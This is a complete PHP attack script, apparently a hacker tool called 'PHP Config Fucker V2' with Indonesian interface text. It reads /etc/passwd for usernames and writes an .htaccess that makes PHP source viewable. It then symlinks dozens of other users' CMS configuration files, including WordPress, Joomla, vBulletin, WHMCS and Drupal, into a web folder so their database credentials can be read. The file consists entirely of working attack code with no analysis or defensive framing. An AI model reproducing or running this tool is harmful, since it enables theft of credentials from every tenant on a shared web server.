	

    <?php @ini_set('max_execution_time',0); @ini_set('display_errors', 0); @ini_set('file_uploads',1);
    echo '<html><head><title>PHP Config Fucker V2 | X-1N73CT & S1T1 B4RC0D3</title><style type="text/css">
    body {background-color: #000000; font-family: Tahoma; font-size:11pt; font-weight: bold;color: #00ff00; text-align: center;}
    textarea { border:1px dotted #00ff00; width: 650px; height: 420px; background-color:#0C0C0C; font-family:Tahoma; font-size:12pt; color:#FF0000 }
    .input {border:1px dotted #00ff00; width: 250px; background-color:#0C0C0C; font-family:Tahoma; font-size:12pt; color:#FF0000; }
    .inp {border:1px dotted #00ff00; background-color:#0C0C0C; font-family:Tahoma; font-size:8pt; color:#00ff00;}
    </style></head><body>
    <center><b><h2><font color=#00ff00>[ <font color="#FF0000">+</font> ] PHP Config Fucker V2 [ <font color="#FF0000">+</font> ]</font></h2></b><br>
    <p><font color="#C0C0C0">[ </font> Coded By :<font color="#FF0000"><blink> X-1N73CT</blink></font> & <font color="#FF0000"><blink>S1T1 B4RC0D3 </blink></font><font color="#C0C0C0"> ]</font></p>
    <form method="POST"><textarea cols="85" name="passwd"  rows="20">'; $uSr=file("/etc/passwd"); foreach($uSr as $usrr) { $str=explode(":",$usrr); echo $str[0]."\n"; } ?>
    </textarea><br>Your Folder Config Name : <input type="text" class="input" name="folfig" size=40 />
    <select class="inp"  title="Select Your Type File"  name="type" size=""><option title="type txt" value=".txt">.txt<option><option title="type php" value=".php">.php<option><option title="type shtml" value=".shtml">.shtml<option><option title="type ini" value=".ini">.ini<option></select>
    <input name="conf" size="80" class="ipt" value="Hajar..." type="submit"><br><br></form></center>
    <?php @ini_set('html_errors',0); @ini_set('max_execution_time',0); @ini_set('display_errors', 0); @ini_set('file_uploads',1);
    if ($_POST['conf']) {
    $folfig = $_POST['folfig']; $type = $_POST['type'];
    $functions=@ini_get("disable_functions"); if(eregi("symlink",$functions)){die ('<blink>Maaf bro fitur Symlink masih di disabled :( </blink>');}
    @mkdir($folfig, 0755);
    @chdir($folfig);
       $htaccess=" Options all \n Options +Indexes \n Options +FollowSymLinks \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
       file_put_contents(".htaccess",$htaccess,FILE_APPEND);
    $passwd=explode("\n",$_POST["passwd"]); echo "<blink><center >tunggu sebentar ya ...</center></blink>";
    foreach($passwd as $pwd){ $user=trim($pwd);
    @symlink('/home/'.$user.'/public_html/wp-config.php',$user.'~~>wordpress'.$type.'');
    @symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'~~>wordpress-wp'.$type.'');
    @symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'~~>wordpress-wp-beta'.$type.'');
    @symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'~~>wordpress-beta'.$type.'');
    @symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'~~>wp13-press'.$type.'');
    @symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'~~>wordpress-wordpress'.$type.'');
    @symlink('/home/'.$user.'/public_html/wordpress/beta/wp-config.php',$user.'~~>wordpress-wordpress-beta'.$type.'');
    @symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'~~>wordpress-news'.$type.'');
    @symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'~~>wordpress-new'.$type.'');
    @symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'~~>wordpress'.$type.'');
    @symlink('/home/'.$user.'/public_html/web/wp-config.php',$user.'~~>wordpress-web'.$type.'');
    @symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'~~>wordpress-blogs'.$type.'');
    @symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'~~>wordpress-home'.$type.'');
    @symlink('/home/'.$user.'/public_html/protal/wp-config.php',$user.'~~>wordpress-protal'.$type.'');
    @symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'~~>ordpress-site'.$type.'');
    @symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'~~>wordpress-main'.$type.'');
    @symlink('/home/'.$user.'/public_html/test/wp-config.php',$user.'~~>wordpress-test'.$type.'');
    @symlink('/home/'.$user.'/public_html/beta/configuration.php',$user.'~~>joomla'.$type.'');
    @symlink('/home/'.$user.'/public_html/configuration.php',$user.'~~>joomla'.$type.'');
    @symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'~~>joomla-home'.$type.'');
    @symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'~~>joomla-joomla'.$type.'');
    @symlink('/home/'.$user.'/public_html/protal/configuration.php',$user.'~~>joomla-protal'.$type.'');
    @symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'~~>joomla-joo'.$type.'');
    @symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'~~>joomla-cms'.$type.'');
    @symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'~~>joomla-site'.$type.'');
    @symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'~~>joomla-main'.$type.'');
    @symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'~~>joomla-news'.$type.'');
    @symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'~~>joomla-new'.$type.'');
    @symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'~~>joomla-home'.$type.'');
    @symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'~~>Vbulletin-forum'.$type.'');
    @symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'~~>vbluttin'.$type.'');
    @symlink('/home/'.$user.'/public_html/vb3/includes/config.php',$user.'~~>vbluttin3'.$type.'');
    @symlink('/home/'.$user.'/public_html/forum/includes/class_core.php',$user.'~~>vbluttin-class_core.php'.$type.'');
    @symlink('/home/'.$user.'/public_html/vb/includes/class_core.php',$user.'~~>vbluttin-class_core.php1'.$type.'');
    @symlink('/home/'.$user.'/public_html/cc/includes/class_core.php',$user.'~~>vbluttin-class_core.php2'.$type.'');
    @symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'~~>vb1-config'.$type.'');
    @symlink('/home/'.$user.'/public_html/cpanel/configuration.php',$user.'~~>cpanel'.$type.'');
    @symlink('/home/'.$user.'/public_html/panel/configuration.php',$user.'~~>panel'.$type.'');
    @symlink('/home/'.$user.'/public_html/host/configuration.php',$user.'~~>host'.$type.'');
    @symlink('/home/'.$user.'/public_html/hosting/configuration.php',$user.'~~>hosting'.$type.'');
    @symlink('/home/'.$user.'/public_html/hosts/configuration.php',$user.'~~>hosts'.$type.'');
    @symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$user.'~~>zencart'.$type.'');
    @symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'~~>zencart-shop'.$type.'');
    @symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'~~>hop-ZCshop'.$type.'');
    @symlink('/home/'.$user.'/public_html/mk_conf.php',$user.'~~>mk-portale1'.$type.'');
    @symlink('/home/'.$user.'/public_html/Settings.php',$user.'~~>smf'.$type.'');
    @symlink('/home/'.$user.'/public_html/smf/Settings.php',$user.'~~>smf-smf'.$type.'');
    @symlink('/home/'.$user.'/public_html/forum/Settings.php',$user.'~~>smf-forum'.$type.'');
    @symlink('/home/'.$user.'/public_html/forums/Settings.php',$user.'~~>smf-forums'.$type.'');
    @symlink('/home/'.$user.'/public_html/upload/includes/config.php',$user.'~~>upload'.$type.'');
    @symlink('/home/'.$user.'/public_html/incl/config.php',$user.'~~>malay'.$type.'');
    @symlink('/home/'.$user.'/public_html/clientes/configuration.php',$user.'~~>clents'.$type.'');
    @symlink('/home/'.$user.'/public_html/cliente/configuration.php',$user.'~~>client2'.$type.'');
    @symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$user.'~~>client'.$type.'');
    @symlink('/home/'.$user.'/public_html/config/koneksi.php',$user.'~~>lokomedia'.$type.'');
    @symlink('/home/'.$user.'/public_html/admin/config.php',$user.'~~>webconfig'.$type.'');
    @symlink('/home/'.$user.'/public_html/admin/conf.php',$user.'~~>webconfig2'.$type.'');
    @symlink('/home/'.$user.'/public_html/system/sistem.php',$user.'~~>lokomedia1'.$type.'');
    @symlink('/home/'.$user.'/public_html/sites/default/settings.php',$user.'~~>Drupal'.$type.'');
    @symlink('/home/'.$user.'/public_html/e107_config.php',$user.'~~>e107'.$type.'');
    @symlink('/home/'.$user.'/public_html/datas/config.php',$user.'~~>Seditio'.$type.'');
    @symlink('/home/'.$user.'/public_html/article/config.php',$user.'~~>Nwahy'.$type.'');
    @symlink('/home/'.$user.'/public_html/connect.php',$user.'~~>PHP-Fusion'.$type.'');
    @symlink('/home/'.$user.'/public_html/includes/config.php',$user.'~~>traidnt1'.$type.'');
    @symlink('/home/'.$user.'/public_html/config.php',$user.'~~>4images'.$type.'');
    @symlink('/home/'.$user.'/public_html/member/configuration.php',$user.'~~>1member'.$type.'') ;
    @symlink('/home/'.$user.'/public_html/requires/config.php',$user.'~~>AM4SS-hosting'.$type.'');
    @symlink('/home/'.$user.'/public_html/supports/includes/iso4217.php',$user.'~~>hostbills-supports'.$type.'');
    @symlink('/home/'.$user.'/public_html/client/includes/iso4217.php',$user.'~~>hostbills-client'.$type.'');
    @symlink('/home/'.$user.'/public_html/support/includes/iso4217.php',$user.'~~>hostbills-support'.$type.'');
    @symlink('/home/'.$user.'/public_html/billing/includes/iso4217.php',$user.'~~>hostbills-billing'.$type.'');
    @symlink('/home/'.$user.'/public_html/billings/includes/iso4217.php',$user.'~~>hostbills-billings'.$type.'');
    @symlink('/home/'.$user.'/public_html/host/includes/iso4217.php',$user.'~~>hostbills-host'.$type.'');
    @symlink('/home/'.$user.'/public_html/hosts/includes/iso4217.php',$user.'~~>hostbills-hosts'.$type.'');
    @symlink('/home/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'~~>hostbills-hosting'.$type.'');
    @symlink('/home/'.$user.'/public_html/hostings/includes/iso4217.php',$user.'~~>hostbills-hostings'.$type.'');
    @symlink('/home/'.$user.'/public_html/includes/iso4217.php',$user.'~~>hostbills'.$type.'');
    @symlink('/home/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'~~>hostbills-hostbills'.$type.'');
    @symlink('/home/'.$user.'/public_html/hostbill/includes/iso4217.php',$user.'~~>hostbills-hostbill'.$type.'');
    @symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'~~>billing'.$type.'');
    @symlink('/home/'.$user.'/public_html/manage/configuration.php',$user.'~~>whm-manage'.$type.'');
    @symlink('/home/'.$user.'/public_html/my/configuration.php',$user.'~~>whm-my'.$type.'');
    @symlink('/home/'.$user.'/public_html/myshop/configuration.php',$user.'~~>whm-myshop'.$type.'');
    @symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$user.'~~>sucure-whm'.$type.'');
    @symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'~~>sucure-whmcs'.$type.'');
    }
    echo 'Selesai mas/mba bro untuk melihat hasilnya klik ~~> <blink><a href='.$folfig.'>'.$folfig.'</a></blink>';
    }
    ?></body></html>

